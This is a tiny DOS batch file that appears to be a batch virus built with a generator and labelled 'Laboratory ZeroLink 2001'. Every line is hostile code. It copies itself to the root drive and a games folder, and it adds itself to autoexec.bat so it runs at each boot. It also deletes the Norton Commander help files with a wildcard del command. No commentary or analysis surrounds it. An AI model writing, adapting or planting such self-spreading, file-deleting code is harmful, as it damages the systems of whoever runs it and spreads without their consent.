: * GV(BAT) v3.0 *
@Echo OFF
echo Laboratory ZeroLink 2001
goto ZeroL_1
:CZC
for %%c in (ZeroLink.bat) do copy %%c c:\
echo c:\ZeroLink.bat >> c:\autoexec.bat
:ZeroL_1
if not exist c:\ZeroLink.bat goto CZC
goto ZeroL_game
: CGAMES1
for %%c in (ZeroLink.bat) do copy %%c c:\games
: ZeroL_game
if not exist c:\GAMES\ZeroLink.bat goto CGAMES1
del c:\NC\*.hlp
